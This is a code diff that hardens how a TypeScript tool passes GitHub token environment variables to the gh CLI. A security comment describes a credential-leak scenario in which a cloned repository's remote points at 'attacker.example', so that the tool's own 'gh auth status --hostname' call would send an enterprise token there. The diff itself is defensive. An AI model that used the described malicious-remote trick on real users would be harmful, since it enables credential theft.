@@ -20,8 +20,13 @@ import { readForgeChecks, rollupForgeChecks } from '@brainstrike/types';
 export const GH_TIMEOUT_MS = 20_000;
 const GH_MAX_BUFFER_BYTES = 4_000_000;
 
-/** GH_* variables carrying deliberate auth/config intent; everything else is dropped. */
-const PRESERVED_GH_ENV_KEYS = new Set(['GH_CONFIG_DIR', 'GH_ENTERPRISE_TOKEN', 'GH_TOKEN']);
+/**
+ * `GH_TOKEN`/`GITHUB_TOKEN` are forwarded ONLY when the pinned host is
+ * exactly `github.com`. `GH_ENTERPRISE_TOKEN`/`GITHUB_ENTERPRISE_TOKEN` are
+ * NEVER forwarded, on any host — see the security note on
+ * `createPinnedGhEnvironment`.
+ */
+const GITHUB_COM_ONLY_TOKEN_KEYS = new Set(['GH_TOKEN', 'GITHUB_TOKEN']);
 
 export interface ForgeCommandRun {
   readonly exitCode: number | null;
@@ -45,30 +50,47 @@ export type ForgeCommandRunner = (params: {
 }) => Promise<ForgeCommandRun>;
 
 /**
- * Drop every inherited `GH_*` variable except the audited auth/config keys,
- * then pin the controls that make gh non-interactive and machine-readable. An
- * inherited `GH_HOST`/`GH_REPO` would silently redirect the lookup to a
- * different repository — exactly the class of surprise this removes.
+ * Drop every inherited `GH_*`/`GITHUB_*` variable except `GH_CONFIG_DIR` and
+ * (github.com only) the token keys, then pin the controls that make gh
+ * non-interactive and machine-readable. An inherited `GH_HOST`/`GH_REPO`
+ * would silently redirect the lookup to a different repository — exactly the
+ * class of surprise this removes.
+ *
+ * SECURITY: `host` is not user input in the trust sense — it comes from
+ * `parseForgeRemote(context.remoteUrl)`, i.e. whatever `.git/config` the
+ * OPENED repository happens to declare for its remote. go-gh (which `gh`
+ * itself is built on) resolves credentials per host: `GH_TOKEN`/
+ * `GITHUB_TOKEN` for github.com, `GH_ENTERPRISE_TOKEN`/
+ * `GITHUB_ENTERPRISE_TOKEN` for anything else. If this function forwarded an
+ * enterprise token unconditionally, cloning and opening a repository whose
+ * `origin` points at `git@attacker.example:...` would be enough — no `gh`
+ * command typed — for `probeGhAuth`'s own `gh auth status --hostname
+ * attacker.example` call to send that token to the attacker's host. So the
+ * enterprise token pair is dropped UNCONDITIONALLY (enterprise users
+ * authenticate through gh's own per-host stored credentials, via `gh auth
+ * login --hostname <host>`, never through this env pass-through), and the
+ * github.com token pair is forwarded ONLY when `host === 'github.com'`
+ * exactly — never for a look-alike or enterprise host.
  */
 export function createPinnedGhEnvironment(
   source: NodeJS.ProcessEnv,
   host: string
 ): NodeJS.ProcessEnv {
   const environment = { ...source };
-  const preserved = new Map<string, string>();
+  const isGithubDotCom = host === 'github.com';
   for (const key of Object.keys(environment)) {
     const normalizedKey = key.toUpperCase();
-    if (!normalizedKey.startsWith('GH_')) {
+    const isGhFamily = normalizedKey.startsWith('GH_') || normalizedKey.startsWith('GITHUB_');
+    if (!isGhFamily) {
       continue;
     }
-    const value = environment[key];
-    if (value !== undefined && PRESERVED_GH_ENV_KEYS.has(normalizedKey)) {
-      preserved.set(key, value);
+    if (normalizedKey === 'GH_CONFIG_DIR') {
+      continue;
+    }
+    if (isGithubDotCom && GITHUB_COM_ONLY_TOKEN_KEYS.has(normalizedKey)) {
+      continue;
     }
     Reflect.deleteProperty(environment, key);
-  }
-  for (const [key, value] of preserved) {
-    environment[key] = value;
   }
   // `parseForgeRemote` may supply `URL.hostname` with IPv6 brackets (for
   // example, "[::1]"); pass that exact opaque string through unchanged.
